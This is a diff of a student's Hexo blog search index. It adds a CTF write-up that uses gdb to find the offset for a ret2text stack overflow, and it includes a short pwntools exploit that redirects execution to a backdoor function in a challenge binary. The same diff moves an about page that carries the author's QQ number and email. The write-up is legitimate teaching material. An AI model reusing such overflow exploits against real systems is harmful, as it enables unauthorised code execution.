@@ -11,15 +11,6 @@ from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A
 ]]></content>
   </entry>
   <entry>
-    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
-    <url>/posts/d4f00467.html</url>
-    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，最后发现是自己改完后没有保存
-看一下左下角的时间，如果是now那就证明保存了
-另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
-最后，感谢我磊哥再一次救我
-]]></content>
-  </entry>
-  <entry>
     <title>梦开始的地方</title>
     <url>/posts/1234.html</url>
     <content><![CDATA[我的博客搭建终于好了！
@@ -27,13 +18,29 @@ from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/about/index.html</url>
-    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
+    <title>用gdb的动态视角看ret2text的实现</title>
+    <url>/posts/2ee84d32.html</url>
+    <content><![CDATA[来看一道非常简单的栈溢出
 
-兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》
+后门函数地址ida里很明显，0x8048521
+exp本身不难写,下面看一下怎么用gdb确定偏移
+from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);gdb.attach(io,&quot;b main&quot;) #在main函数下断点payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)io.sendline(payload)io.interactive()
 
-联系我QQ 1935572185163邮箱 lzr20061008@163.com
+
+
+0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）
+用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量
+我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址
+
+]]></content>
+  </entry>
+  <entry>
+    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
+    <url>/posts/d4f00467.html</url>
+    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
+看一下左下角的时间，如果是now那就证明保存了
+另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
+最后，感谢我磊哥再一次救我
 ]]></content>
   </entry>
   <entry>
@@ -471,6 +478,16 @@ div#category {
     rgba(90, 90, 90, 0.8));
 }
 
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/about/index.html</url>
+    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
+
+兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》
+
+联系我QQ 1935572185163邮箱 lzr20061008@163.com
 ]]></content>
   </entry>
 </search>
